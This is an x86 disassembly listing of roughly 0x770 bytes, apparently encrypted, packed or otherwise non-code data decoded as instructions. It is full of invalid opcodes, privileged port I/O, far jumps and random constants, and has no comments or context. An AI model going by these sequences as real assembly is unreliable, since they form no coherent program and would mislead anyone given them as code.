  41f5ca:	cmp    BYTE PTR [edx+0x74c3d6e7],bl
  41f5d0:	fld    DWORD PTR [esi+0x17f5fbc1]
  41f5d6:	imul   edx,DWORD PTR [ecx-0x5c],0x25b0f419
  41f5dd:	adc    edi,eax
  41f5df:	cs push edi
  41f5e1:	shl    BYTE PTR [edi-0x6e7becc8],0x4e
  41f5e8:	lods   eax,DWORD PTR ds:[esi]
  41f5e9:	adc    bl,ah
  41f5eb:	cdq    
  41f5ec:	inc    ebx
  41f5ed:	dec    ebp
  41f5ee:	sbb    eax,0x2016dea2
  41f5f3:	jmp    FWORD PTR [eax-0x2b293d20]
  41f5f9:	dec    ebp
  41f5fa:	outs   dx,DWORD PTR ds:[esi]
  41f5fb:	rep ins DWORD PTR es:[edi],dx
  41f5fd:	jmp    0xa564:0xcb3a3453
  41f604:	mov    al,BYTE PTR [edx-0x505d3770]
  41f60a:	jne    0x41f620
  41f60c:	iret   
  41f60d:	jo     0x41f599
  41f60f:	loope  0x41f5af
  41f611:	shl    dl,1
  41f613:	(bad)  
  41f614:	push   0x40c39a36
  41f619:	or     DWORD PTR [eax+0x6d739aba],esp
  41f61f:	push   esi
  41f620:	cmp    al,0xba
  41f622:	icebp  
  41f623:	or     al,0x7f
  41f625:	mov    dh,0x73
  41f627:	call   0x5abe8884
  41f62c:	xchg   ecx,eax
  41f62d:	imul   esp,DWORD PTR [esi-0x20fd83ff],0x3a
  41f634:	imul   ecx,DWORD PTR [ebp+0x66],0xe98f1e02
  41f63b:	in     eax,0xed
  41f63d:	dec    esi
  41f63e:	daa    
  41f63f:	sti    
  41f640:	aas    
  41f641:	ja     0x41f5e0
  41f643:	xor    eax,0x6d9e20cc
  41f648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f649:	mov    ebx,0x6d76e5c6
  41f64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f64f:	xchg   ebx,eax
  41f650:	mov    WORD PTR [edi+0x23e7691c],cs
  41f656:	(bad)  
  41f658:	xlat   BYTE PTR ds:[ebx]
  41f659:	inc    edx
  41f65a:	mov    ?,WORD PTR [edi-0x38cdce9a]
  41f660:	sbb    eax,0x9a681443
  41f665:	add    DWORD PTR [ebp-0x5065aaa0],eax
  41f66b:	adc    eax,0x63d70a08
  41f670:	rol    DWORD PTR [esi-0x18505dc1],cl
  41f676:	pop    es
  41f677:	in     al,dx
  41f678:	xchg   ebx,eax
  41f679:	jg     0x41f659
  41f67b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f67c:	in     eax,0x45
  41f67e:	mov    DWORD PTR [esi],eax
  41f680:	jne    0x41f63b
  41f682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f683:	mov    ch,0xe0
  41f685:	lahf   
  41f686:	jge    0x9828023d
  41f68c:	mov    ebp,0xb2c12178
  41f691:	fsub   QWORD PTR [edx+0x16703b67]
  41f697:	aas    
  41f698:	mov    dl,ch
  41f69a:	mov    ecx,0x2fa7df3b
  41f69f:	jo     0x41f702
  41f6a1:	out    0x6a,eax
  41f6a3:	push   edx
  41f6a4:	dec    ecx
  41f6a5:	mov    dh,0x54
  41f6a7:	xor    bl,dh
  41f6a9:	or     al,BYTE PTR [ebx+0x314dfbe5]
  41f6af:	adc    DWORD PTR [edi+0x1c],esp
  41f6b2:	into   
  41f6b3:	ja     0x41f6f9
  41f6b5:	into   
  41f6b6:	pop    edx
  41f6b7:	jmp    0x7102:0x7a1dad05
  41f6be:	mov    ebx,0x46a9c517
  41f6c3:	jl     0x41f6ff
  41f6c5:	(bad)  
  41f6c6:	add    DWORD PTR [eax+edx*2-0x6a],esi
  41f6ca:	adc    al,BYTE PTR [ebx-0xf]
  41f6cd:	push   esp
  41f6ce:	jmp    0xbcc:0xb88cca59
  41f6d5:	imul   edx,DWORD PTR [edi-0x371e628],0x4a
  41f6dc:	dec    ecx
  41f6dd:	sbb    al,0x3c
  41f6df:	sti    
  41f6e0:	push   ecx
  41f6e1:	sahf   
  41f6e2:	idiv   DWORD PTR [ebx+0xc]
  41f6e5:	or     al,0x45
  41f6e7:	imul   edx,DWORD PTR [ebp-0x10],0xcdd59df6
  41f6ee:	mov    eax,0xda9e12c1
  41f6f3:	out    dx,al
  41f6f4:	fs in  eax,dx
  41f6f6:	fimul  WORD PTR [edi-0x13]
  41f6f9:	mov    edi,0x19875a0f
  41f6fe:	pop    eax
  41f6ff:	sub    al,0x90
  41f701:	and    BYTE PTR [ebx+0x1a],cl
  41f704:	psubq  mm6,QWORD PTR [eax+0x7c154018]
  41f70b:	test   ebx,ebp
  41f70d:	cdq    
  41f70e:	mov    cl,BYTE PTR [eax+ebp*1+0x7422666c]
  41f715:	jmp    0xd53e2265
  41f71a:	mov    edx,0xb99f6955
  41f71f:	hlt    
  41f720:	in     eax,0x26
  41f722:	mov    BYTE PTR [edi+ecx*2-0x24],ah
  41f726:	lea    ebx,[ecx]
  41f728:	xor    eax,0x20b20fc3
  41f72d:	aas    
  41f72e:	jo     0x41f78d
  41f730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f731:	push   edx
  41f732:	rcl    BYTE PTR [edi],1
  41f734:	xor    eax,0x59a521eb
  41f739:	push   edi
  41f73a:	inc    edi
  41f73b:	push   cs
  41f73c:	and    eax,0x9c7069ad
  41f741:	loop   0x41f775
  41f743:	push   esi
  41f744:	call   0xcaab8e2d
  41f749:	bound  eax,QWORD PTR [ebx-0x67e9f49]
  41f74f:	nop
  41f750:	or     dl,BYTE PTR ds:0xef0b9e66
  41f756:	mov    esp,0x9ca99949
  41f75b:	mov    ebp,DWORD PTR [esi+0x2108f546]
  41f761:	mov    eax,ds:0x40cc9a6a
  41f766:	xor    dh,dh
  41f768:	pop    eax
  41f769:	sbb    DWORD PTR ds:[ebx+0x32],0x79f36683
  41f771:	scas   eax,DWORD PTR es:[edi]
  41f772:	daa    
  41f773:	pop    ds
  41f774:	(bad)  
  41f775:	jmp    0x41f781
  41f777:	in     al,0xe8
  41f779:	and    DWORD PTR [ebx+0x71],0xe960389
  41f780:	loop   0x41f7b5
  41f782:	adc    DWORD PTR [edx+0x3b],ecx
  41f785:	jl     0x41f70b
  41f787:	mov    dl,0x94
  41f789:	not    BYTE PTR [eax+ebp*8-0xe]
  41f78d:	aas    
  41f78e:	push   ebp
  41f78f:	sub    al,0x69
  41f791:	lods   al,BYTE PTR ds:[esi]
  41f792:	or     edi,DWORD PTR [esi+eax*1]
  41f795:	xor    eax,0xdd5cfc11
  41f79a:	hlt    
  41f79b:	imul   ebp,DWORD PTR [ebx-0x6d15d432],0x3
  41f7a2:	cmp    eax,0x3573674a
  41f7a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7a8:	pusha  
  41f7a9:	in     al,0xea
  41f7ab:	inc    esi
  41f7ac:	sbb    al,dh
  41f7ae:	xchg   BYTE PTR [ecx+ebx*1+0x49239703],cl
  41f7b5:	int3   
  41f7b6:	push   ebx
  41f7b7:	pand   mm0,mm3
  41f7ba:	xchg   BYTE PTR [eax+edx*1-0x6828f8d9],ch
  41f7c1:	jecxz  0x41f783
  41f7c3:	test   al,0x7c
  41f7c5:	imul   esi,edx,0xffffff8a
  41f7c8:	int    0x5
  41f7ca:	pop    edx
  41f7cb:	push   0xa172509b
  41f7d0:	daa    
  41f7d1:	push   esi
  41f7d2:	test   al,0x42
  41f7d4:	push   cs
  41f7d5:	xchg   edx,eax
  41f7d6:	sub    eax,0x6b48f821
  41f7db:	push   edx
  41f7dc:	mov    cl,0x87
  41f7de:	les    edi,FWORD PTR [edi]
  41f7e0:	ss xchg edx,eax
  41f7e2:	lock lock push ss
  41f7e5:	sbb    ecx,DWORD PTR [ebp-0x6d]
  41f7e8:	cmc    
  41f7e9:	pusha  
  41f7ea:	add    BYTE PTR [edx+0x6a623ffd],ch
  41f7f0:	dec    ebx
  41f7f1:	jnp    0x41f841
  41f7f3:	ins    BYTE PTR es:[edi],dx
  41f7f4:	xchg   DWORD PTR [eax-0x2bfbed81],edi
  41f7fa:	fs xchg esp,eax
  41f7fc:	jle    0x41f7cc
  41f7fe:	dec    ecx
  41f7ff:	add    al,0x53
  41f801:	fs adc eax,0x3ec98a0c
  41f807:	daa    
  41f808:	mov    WORD PTR [ecx+0x8],cs
  41f80b:	xchg   edx,eax
  41f80c:	out    dx,eax
  41f80d:	icebp  
  41f80e:	lfs    esp,FWORD PTR [esi+0x59efd504]
  41f815:	in     al,0x73
  41f817:	add    BYTE PTR [eax],bh
  41f819:	stc    
  41f81a:	and    al,0xc9
  41f81c:	sbb    BYTE PTR [edx],al
  41f81e:	sub    BYTE PTR [edi],al
  41f820:	mov    ?,WORD PTR [ebx]
  41f822:	ret    
  41f823:	frstor [esi-0x4e]
  41f826:	out    0xc3,al
  41f828:	xchg   esp,eax
  41f829:	fild   QWORD PTR ds:0xf52a51a3
  41f82f:	rcr    BYTE PTR [ebx+ecx*8-0x6e981eae],0x13
  41f837:	pop    ebx
  41f838:	cdq    
  41f839:	inc    edi
  41f83a:	(bad)  
  41f83b:	mov    bh,ch
  41f83d:	or     al,0x8b
  41f83f:	xchg   edi,eax
  41f840:	sub    al,0x7a
  41f842:	shl    esp,0x7e
  41f845:	mov    DWORD PTR [esi],ebx
  41f847:	ss jnp 0x41f8c8
  41f84a:	sub    esi,0x5e
  41f84d:	ror    ch,cl
  41f84f:	mov    cl,ah
  41f851:	pop    ebx
  41f852:	jns    0x41f8c3
  41f854:	jo     0x41f873
  41f856:	add    al,0xb4
  41f858:	push   ebp
  41f859:	rcl    esp,1
  41f85b:	jp     0x41f8a6
  41f85d:	mov    al,0x24
  41f85f:	fdiv   DWORD PTR [esi]
  41f861:	test   eax,0x741df5c4
  41f866:	fwait
  41f867:	int    0xf5
  41f869:	icebp  
  41f86a:	pop    ecx
  41f86b:	adc    dh,dl
  41f86d:	stos   BYTE PTR es:[edi],al
  41f86e:	movd   DWORD PTR [ecx+0x5],mm1
  41f872:	mov    dl,0x83
  41f874:	int3   
  41f875:	xchg   edi,eax
  41f876:	adc    BYTE PTR [ebp+0x51d3d049],ch
  41f87c:	mov    edi,0x904af044
  41f881:	in     al,dx
  41f882:	ret    
  41f883:	add    BYTE PTR [eax+eiz*4],dl
  41f886:	loopne 0x41f88e
  41f888:	and    bh,BYTE PTR [edi+0x4c]
  41f88b:	inc    eax
  41f88c:	adc    dl,ah
  41f88e:	jnp    0x41f8ef
  41f890:	jmp    0x3d74:0x158b62b1
  41f897:	push   0x9eaaee1a
  41f89c:	bound  ebx,QWORD PTR [eax+0x4664d624]
  41f8a2:	pop    ss
  41f8a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8a4:	inc    ebp
  41f8a5:	scas   al,BYTE PTR es:[edi]
  41f8a6:	mov    bl,0x8f
  41f8a8:	imul   esp,DWORD PTR [esi],0xab855f13
  41f8ae:	jno    0x41f87c
  41f8b0:	pop    ecx
  41f8b1:	sbb    al,0xce
  41f8b3:	fsubr  st(0),st
  41f8b5:	enter  0x9334,0x32
  41f8b9:	test   BYTE PTR [ebx-0x6a160d7a],bl
  41f8bf:	inc    esi
  41f8c0:	jo     0x41f885
  41f8c2:	add    BYTE PTR [ebx],ch
  41f8c4:	jbe    0x41f8ea
  41f8c6:	ret    
  41f8c7:	sahf   
  41f8c8:	test   eax,0xf62bc751
  41f8cd:	cdq    
  41f8ce:	mov    WORD PTR [esi+0x5e954f66],?
  41f8d4:	add    al,0x72
  41f8d6:	in     eax,dx
  41f8d7:	test   BYTE PTR [eax],cl
  41f8d9:	inc    esi
  41f8da:	stc    
  41f8db:	dec    edi
  41f8dc:	cmp    BYTE PTR [eax+0x5b7fe981],bl
  41f8e2:	xchg   ecx,eax
  41f8e3:	mov    ebp,0x86b10d53
  41f8e8:	fmul   DWORD PTR [ecx+0x26]
  41f8eb:	loope  0x41f8fd
  41f8ed:	ins    BYTE PTR es:[edi],dx
  41f8ee:	jns    0x41f96a
  41f8f0:	fsubr  st(2),st
  41f8f2:	sub    al,0xc1
  41f8f4:	gs pop ss
  41f8f6:	dec    eax
  41f8f7:	fadd   DWORD PTR [edi-0x3340ee5b]
  41f8fd:	push   ecx
  41f8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8ff:	pop    edi
  41f900:	mov    ds,WORD PTR [edx+edi*2+0x32]
  41f904:	dec    ebx
  41f905:	adc    DWORD PTR [edx],0x37
  41f908:	push   esp
  41f909:	or     DWORD PTR [eax+0x59],0x11ab60ae
  41f910:	addr16 mov ebx,0x5434a6d5
  41f916:	sti    
  41f917:	shr    BYTE PTR [esi-0x60],0x91
  41f91b:	or     dl,cl
  41f91d:	pop    edx
  41f91e:	addr16 adc dh,al
  41f921:	mov    ebx,0xdd1b8954
  41f926:	cmc    
  41f927:	stos   BYTE PTR es:[edi],al
  41f928:	push   ds
  41f929:	mov    esi,0xa7bfe848
  41f92e:	and    al,0x7a
  41f930:	sbb    cl,BYTE PTR [eax-0x39]
  41f933:	adc    dl,BYTE PTR [ecx-0x43897548]
  41f939:	lds    eax,FWORD PTR ds:0xb258f65a
  41f93f:	jno    0x41f929
  41f941:	xchg   esi,eax
  41f942:	sbb    cl,cl
  41f944:	xlat   BYTE PTR ds:[ebx]
  41f945:	xchg   esi,eax
  41f946:	jmp    0x3888ddb
  41f94b:	scas   eax,DWORD PTR es:[edi]
  41f94c:	out    dx,eax
  41f94d:	or     ah,BYTE PTR [edi]
  41f94f:	sbb    DWORD PTR [eax+ebx*2-0x4a031494],esi
  41f956:	dec    eax
  41f957:	mov    ebp,0x722419a0
  41f95c:	or     ecx,edx
  41f95e:	lods   al,BYTE PTR ds:[esi]
  41f95f:	xchg   BYTE PTR gs:[esi],bl
  41f962:	ror    DWORD PTR [edi-0x4c],0x87
  41f966:	mov    al,ds:0x722c9194
  41f96b:	add    ebx,eax
  41f96d:	lods   eax,DWORD PTR ds:[esi]
  41f96e:	jg     0x41f904
  41f970:	fldcw  WORD PTR [ebx+0x5092af97]
  41f976:	stos   BYTE PTR es:[edi],al
  41f977:	in     eax,dx
  41f978:	dec    esi
  41f979:	pop    ebp
  41f97a:	data16 int 0xce
  41f97d:	xchg   esi,eax
  41f97e:	or     DWORD PTR [edi],esi
  41f980:	inc    ebx
  41f981:	mov    edx,0x8ec2bc89
  41f986:	mov    ?,edx
  41f988:	sti    
  41f989:	leavew 
  41f98b:	mov    ebp,0xc36cdfc0
  41f990:	cmp    eax,0x383e83de
  41f995:	jl     0x41f9b6
  41f997:	push   esp
  41f998:	aaa    
  41f999:	inc    ecx
  41f99a:	dec    esi
  41f99b:	sub    al,0x4
  41f99d:	mov    cl,0x27
  41f99f:	mov    DWORD PTR ds:0xbd9877d0,edx
  41f9a5:	jmp    0xb996:0x4270abb8
  41f9ac:	inc    esi
  41f9ad:	pushf  
  41f9ae:	call   DWORD PTR [ecx-0x5d740980]
  41f9b4:	pop    edi
  41f9b5:	push   edx
  41f9b6:	test   esp,ebx
  41f9b8:	fmulp  st(0),st
  41f9ba:	jecxz  0x41f980
  41f9bc:	rol    DWORD PTR ss:0xd70a63e1,0x3
  41f9c4:	add    ah,0xa5
  41f9c7:	push   ss
  41f9c8:	jmp    0x41f9d6
  41f9ca:	mov    ebp,0x676f8e6f
  41f9cf:	add    dl,ch
  41f9d1:	daa    
  41f9d2:	lock xchg ebp,eax
  41f9d4:	(bad)  
  41f9d5:	xchg   esi,eax
  41f9d6:	sbb    DWORD PTR [edi+0x32be2e7e],eax
  41f9dc:	retf   
  41f9dd:	aas    
  41f9de:	data16 fmul QWORD PTR [edi-0x67]
  41f9e2:	ror    eax,0x77
  41f9e5:	xor    DWORD PTR [ebp-0x4a5be9ff],esi
  41f9eb:	cmp    esp,DWORD PTR [ebp+0x3bad83da]
  41f9f1:	push   0x1e
  41f9f3:	inc    esp
  41f9f4:	or     dh,BYTE PTR [eax]
  41f9f6:	fcomp  DWORD PTR [ebp+0x698ba39f]
  41f9fc:	inc    edi
  41f9fd:	bound  eax,QWORD PTR ds:0x7374d3cd
  41fa03:	xor    al,0x38
  41fa05:	push   esp
  41fa06:	xchg   edx,eax
  41fa07:	(bad)  
  41fa08:	jb     0x41fa63
  41fa0a:	xchg   esp,eax
  41fa0b:	add    eax,0x81d6fbd
  41fa10:	frstor [esi+eax*8]
  41fa13:	lods   eax,DWORD PTR ds:[esi]
  41fa14:	pop    ds
  41fa15:	lea    esp,[ecx-0x47]
  41fa18:	sub    edi,DWORD PTR cs:[edx+0x64]
  41fa1c:	sti    
  41fa1d:	cmp    DWORD PTR [edi-0x73],eax
  41fa20:	jmp    DWORD PTR [ebx]
  41fa22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa23:	shl    DWORD PTR [ebx+0x102aff89],0x18
  41fa2a:	jmp    0x51b1:0x66bb8b97
  41fa31:	sbb    dl,dl
  41fa33:	nop
  41fa34:	xchg   esi,eax
  41fa35:	mov    al,ds:0xa9c1d53c
  41fa3a:	loop   0x41fa14
  41fa3c:	adc    al,0x41
  41fa3e:	mov    edx,DWORD PTR [edx-0x72]
  41fa41:	arpl   sp,sp
  41fa43:	or     eax,0xa09f2a1c
  41fa48:	jge    0x41fa92
  41fa4a:	imul   ebp,DWORD PTR [esp+ecx*8-0x33c2dd],0x3
  41fa52:	mov    edx,0x4013ed36
  41fa57:	sub    dl,BYTE PTR [edx]
  41fa59:	aad    0x75
  41fa5b:	dec    edi
  41fa5c:	clc    
  41fa5d:	mov    dh,0xdd
  41fa5f:	and    cl,BYTE PTR [edx-0x209067de]
  41fa65:	int    0x6c
  41fa67:	inc    ecx
  41fa68:	adc    dl,BYTE PTR [edi-0x1a6fd476]
  41fa6e:	cli    
  41fa6f:	cmp    BYTE PTR [esi-0x7a],dl
  41fa72:	pop    edx
  41fa73:	cld    
  41fa74:	and    eax,0xe7d5c17b
  41fa79:	push   es
  41fa7a:	xor    BYTE PTR [edx],bl
  41fa7c:	stc    
  41fa7d:	xchg   ecx,eax
  41fa7e:	sub    bl,BYTE PTR [edi+eiz*1+0x77]
  41fa82:	xlat   BYTE PTR ds:[ebx]
  41fa83:	lods   al,BYTE PTR ds:[esi]
  41fa84:	xor    al,0x1a
  41fa86:	sti    
  41fa87:	shld   DWORD PTR [ecx],ecx,cl
  41fa8a:	pop    esp
  41fa8b:	mov    edi,0x41a5ce2b
  41fa90:	mov    eax,0xaab30be
  41fa95:	xlat   BYTE PTR ds:[ebx]
  41fa96:	stos   DWORD PTR es:[edi],eax
  41fa97:	pop    esi
  41fa98:	push   ds
  41fa99:	push   edi
  41fa9a:	mov    ch,dl
  41fa9c:	mov    ebp,0xc8a344eb
  41faa1:	or     al,0x41
  41faa3:	jge    0x41fa33
  41faa5:	jae    0x41fb09
  41faa7:	adc    al,0x73
  41faa9:	push   0xffffffaa
  41faab:	aaa    
  41faac:	les    eax,FWORD PTR [edi]
  41faae:	jno    0x41facf
  41fab0:	cmp    BYTE PTR [edi+0x53],0xb8
  41fab4:	je     0x41faa0
  41fab6:	mov    dh,0xb
  41fab8:	div    DWORD PTR [edi]
  41faba:	ret    0x2a87
  41fabd:	adc    al,0xdc
  41fabf:	pop    ecx
  41fac0:	push   ds
  41fac1:	retf   0xcd5d
  41fac4:	cwde   
  41fac5:	xsaves [ebx-0xa]
  41fac9:	jne    0x41facf
  41facb:	(bad)  
  41facc:	adc    dl,BYTE PTR [eax]
  41face:	fadd   QWORD PTR [eax-0x45]
  41fad1:	mov    DWORD PTR ds:0x6cad0863,0x34f1941e
  41fadb:	imul   ecx,ebp,0x9fdf8e6c
  41fae1:	add    al,0xa3
  41fae3:	push   edi
  41fae4:	loop   0x41fafc
  41fae6:	ror    ecx,1
  41fae8:	scas   al,BYTE PTR es:[edi]
  41fae9:	daa    
  41faea:	mov    bh,0xe6
  41faec:	clc    
  41faed:	or     dl,BYTE PTR ds:0x918e74cd
  41faf3:	sbb    al,0xb1
  41faf5:	add    edi,eax
  41faf7:	mov    eax,0x8d0bd9f6
  41fafc:	mov    edi,0x4e60e380
  41fb01:	test   DWORD PTR [esi],esi
  41fb03:	out    dx,al
  41fb04:	lahf   
  41fb05:	loope  0x41fa95
  41fb07:	xchg   DWORD PTR [esi+0x4bc5a34b],esp
  41fb0d:	bound  ecx,QWORD PTR [ebx-0x7278067]
  41fb13:	jmp    0x1a63:0x93ae04ae
  41fb1a:	mov    ?,WORD PTR [ecx]
  41fb1c:	and    ecx,eax
  41fb1e:	call   0xcc888050
  41fb23:	inc    ebx
  41fb24:	push   ds
  41fb25:	jns    0x41fb43
  41fb27:	xor    eax,0xff518781
  41fb2c:	dec    ebp
  41fb2d:	jp     0x41fb78
  41fb2f:	inc    esi
  41fb30:	xor    al,0x3e
  41fb32:	push   ebp
  41fb33:	push   ebp
  41fb34:	test   eax,0xe8ae34c9
  41fb39:	hlt    
  41fb3a:	lods   al,BYTE PTR ds:[esi]
  41fb3b:	std    
  41fb3c:	and    DWORD PTR [edi+0x2b],0x1c
  41fb40:	jp     0x41fb52
  41fb42:	push   ecx
  41fb43:	pusha  
  41fb44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb45:	in     al,0x22
  41fb47:	jecxz  0x41fbc3
  41fb49:	out    dx,eax
  41fb4a:	push   edi
  41fb4b:	test   DWORD PTR [esi+0x51],0x9c47394a
  41fb52:	lods   eax,DWORD PTR ds:[esi]
  41fb53:	xchg   edx,eax
  41fb54:	aas    
  41fb55:	cmp    ecx,DWORD PTR [eax+0x42d77638]
  41fb5b:	pusha  
  41fb5c:	xor    eax,0xeb920318
  41fb61:	retf   
  41fb62:	lods   al,BYTE PTR ds:[esi]
  41fb63:	dec    ecx
  41fb64:	jb     0x41fbba
  41fb66:	push   edi
  41fb67:	or     eax,DWORD PTR [edi]
  41fb69:	in     eax,dx
  41fb6a:	loop   0x41faff
  41fb6c:	xor    BYTE PTR [edi+0xd5c9254],cl
  41fb72:	lds    esi,FWORD PTR [ecx+0x1ea4bf6c]
  41fb78:	pop    ss
  41fb79:	add    bl,0xdc
  41fb7c:	dec    edx
  41fb7d:	push   ebx
  41fb7e:	and    BYTE PTR [edx+esi*4],cl
  41fb81:	shl    DWORD PTR [ebp-0x7d],1
  41fb84:	les    ebx,FWORD PTR [edx]
  41fb86:	sahf   
  41fb87:	test   eax,0x57e09bbb
  41fb8c:	jne    0x41fb42
  41fb8e:	jne    0x41fb93
  41fb90:	pop    ss
  41fb91:	pop    ebp
  41fb92:	or     esi,DWORD PTR [edx]
  41fb94:	mov    ds:0x1c0c442b,al
  41fb99:	scas   al,BYTE PTR es:[edi]
  41fb9a:	aam    0x55
  41fb9c:	and    al,0x63
  41fb9e:	push   eax
  41fb9f:	hlt    
  41fba0:	add    eax,esp
  41fba2:	mov    cl,0x3a
  41fba4:	fst    st(4)
  41fba6:	in     al,0xb9
  41fba8:	mov    ds:0x85e96dd3,al
  41fbad:	xor    edx,ecx
  41fbaf:	shl    DWORD PTR [ebp+0xd],cl
  41fbb2:	stos   BYTE PTR es:[edi],al
  41fbb3:	mov    esi,0x42a3a93
  41fbb8:	pop    ss
  41fbb9:	mov    ebx,0xd23bb8f3
  41fbbe:	test   al,0xd3
  41fbc0:	imul   eax,DWORD PTR [ebp-0x24f8a1f4],0xfffffffe
  41fbc7:	fild   DWORD PTR [ecx]
  41fbc9:	jecxz  0x41fb73
  41fbcb:	mov    bl,0x3a
  41fbcd:	fist   DWORD PTR [edx-0x258ad714]
  41fbd3:	outs   dx,BYTE PTR ds:[esi]
  41fbd4:	ins    DWORD PTR es:[edi],dx
  41fbd5:	and    al,0x13
  41fbd7:	ins    DWORD PTR es:[edi],dx
  41fbd8:	shl    BYTE PTR [eax],0x1a
  41fbdb:	pop    es
  41fbdc:	cmp    DWORD PTR [edi-0x345d3896],0xffffffd3
  41fbe3:	fcmovnbe st,st(6)
  41fbe5:	je     0x41fc4f
  41fbe7:	ds int3 
  41fbe9:	mov    edx,0x3cb70c85
  41fbee:	pop    ss
  41fbef:	aam    0x9
  41fbf1:	loopne 0x41fbb6
  41fbf3:	xor    eax,0x94cd289e
  41fbf8:	mov    ah,0x74
  41fbfa:	cld    
  41fbfb:	test   DWORD PTR [ecx+0x106cf82f],eax
  41fc01:	ret    0xf3fa
  41fc04:	cmp    al,0xad
  41fc06:	jmp    0x41fbeb
  41fc08:	adc    BYTE PTR [edx+0x1f89461f],dh
  41fc0e:	pop    ds
  41fc0f:	fidiv  WORD PTR [esi-0x6c]
  41fc12:	sbb    ecx,DWORD PTR [edi]
  41fc14:	call   0xce07a394
  41fc19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc1a:	mov    edx,0x7cee25dc
  41fc1f:	mov    bh,0x69
  41fc21:	pop    edx
  41fc22:	imul   eax,DWORD PTR [ebx-0x19e5284c],0xffffffd4
  41fc29:	pop    ss
  41fc2a:	rol    ecx,cl
  41fc2c:	xchg   esi,eax
  41fc2d:	cmp    eax,0x82347566
  41fc32:	push   es
  41fc33:	into   
  41fc34:	pop    eax
  41fc35:	sbb    ecx,ecx
  41fc37:	mov    dl,dl
  41fc39:	mov    ds:0x3b8ba70c,al
  41fc3e:	pop    ss
  41fc3f:	mov    DWORD PTR [esi+0x27],eax
  41fc42:	out    dx,al
  41fc43:	push   es
  41fc44:	in     al,0xd0
  41fc46:	push   ecx
  41fc47:	aaa    
  41fc48:	ds adc eax,0xa133a766
  41fc4e:	mov    bl,0xd
  41fc50:	adc    al,0x9
  41fc52:	dec    esp
  41fc53:	pop    ss
  41fc54:	lods   al,BYTE PTR ds:[esi]
  41fc55:	aas    
  41fc56:	adc    DWORD PTR [esi-0x4e],edx
  41fc59:	cs (bad) 
  41fc5b:	or     ebp,DWORD PTR [ebp+0x54]
  41fc5e:	sahf   
  41fc5f:	pop    ebp
  41fc60:	(bad)  
  41fc61:	xlat   BYTE PTR ds:[ebx]
  41fc62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc63:	cwde   
  41fc64:	dec    esi
  41fc65:	cld    
  41fc66:	pop    edx
  41fc67:	pop    edx
  41fc68:	cdq    
  41fc69:	nop
  41fc6a:	stos   BYTE PTR es:[edi],al
  41fc6b:	sahf   
  41fc6c:	mov    eax,0x2216f9a2
  41fc71:	jmp    0x2891f697
  41fc76:	pop    ebx
  41fc77:	sti    
  41fc78:	pop    ebx
  41fc79:	outs   dx,DWORD PTR ds:[esi]
  41fc7a:	adc    DWORD PTR [esp+eiz*8+0x38],eax
  41fc7e:	outs   dx,BYTE PTR ds:[esi]
  41fc7f:	cmp    al,0x64
  41fc81:	mov    edx,0x45153351
  41fc86:	ror    BYTE PTR [edi+0x5fb9c549],0x30
  41fc8d:	adc    bh,BYTE PTR [ebx+0x54]
  41fc90:	retf   0xaf98
  41fc93:	cmp    al,0x8b
  41fc95:	add    DWORD PTR [eax],esi
  41fc97:	mov    esi,0x93d86a3c
  41fc9c:	stos   DWORD PTR es:[edi],eax
  41fc9d:	cmp    DWORD PTR ds:0xda330a55,edi
  41fca3:	dec    ebp
  41fca4:	lahf   
  41fca5:	test   BYTE PTR [edx-0x5d],ah
  41fca8:	adc    esp,ebp
  41fcaa:	fldl2e 
  41fcac:	cli    
  41fcad:	pop    ebx
  41fcae:	out    dx,eax
  41fcaf:	xchg   ebp,eax
  41fcb0:	push   ds
  41fcb1:	pop    esi
  41fcb2:	mov    cl,0x5d
  41fcb4:	stos   DWORD PTR es:[edi],eax
  41fcb5:	push   esp
  41fcb6:	or     eax,0xb69e9f6b
  41fcbb:	(bad)  
  41fcbc:	push   cs
  41fcbd:	(bad)  
  41fcbe:	pop    esi
  41fcbf:	jbe    0x41fc8f
  41fcc1:	pushf  
  41fcc2:	dec    eax
  41fcc3:	pop    eax
  41fcc4:	jg     0x41fd40
  41fcc6:	and    eax,0xf64bd37e
  41fccb:	push   0xffffffac
  41fccd:	jbe    0x41fcda
  41fccf:	out    dx,eax
  41fcd0:	lods   eax,DWORD PTR ds:[esi]
  41fcd1:	add    eax,0xeffabb57
  41fcd6:	hlt    
  41fcd7:	mov    ah,0x55
  41fcd9:	lods   al,BYTE PTR ds:[esi]
  41fcda:	ins    BYTE PTR es:[edi],dx
  41fcdb:	int    0x67
  41fcdd:	xchg   BYTE PTR [ebp-0x63],ah
  41fce0:	retf   0xd8f9
  41fce3:	ret    0xf0cd
  41fce6:	call   0x9b2f:0xe912ab8a
  41fced:	inc    esp
  41fcee:	out    dx,al
  41fcef:	jb     0x41fc75
  41fcf1:	(bad)  [edx+eiz*8-0x82d0bc]
  41fcf8:	mov    eax,0xbf29109b
  41fcfd:	or     al,0xcc
  41fcff:	inc    ebx
  41fd00:	inc    esp
  41fd01:	adc    al,0xbb
  41fd03:	push   ds
  41fd04:	mov    esp,0x24b97203
  41fd09:	or     dh,dh
  41fd0b:	in     al,dx
  41fd0c:	xchg   edx,eax
  41fd0d:	sbb    al,0xcb
  41fd0f:	add    esi,edx
  41fd11:	faddp  st(2),st
  41fd13:	les    edi,FWORD PTR [eax]
  41fd15:	test   al,0x53
  41fd17:	cwde   
  41fd18:	loope  0x41fd93
  41fd1a:	dec    edi
  41fd1b:	dec    edi
  41fd1c:	sar    DWORD PTR [eax+0x300f5d37],cl
  41fd22:	adc    dl,bh
  41fd24:	stos   BYTE PTR es:[edi],al
  41fd25:	das    
  41fd26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd27:	add    al,0xb1
  41fd29:	mov    edx,DWORD PTR [ebx-0x5978ccca]
  41fd2f:	dec    esi
  41fd30:	pop    eax
  41fd31:	mov    DWORD PTR [edx-0x5d],edi
  41fd34:	pop    edx
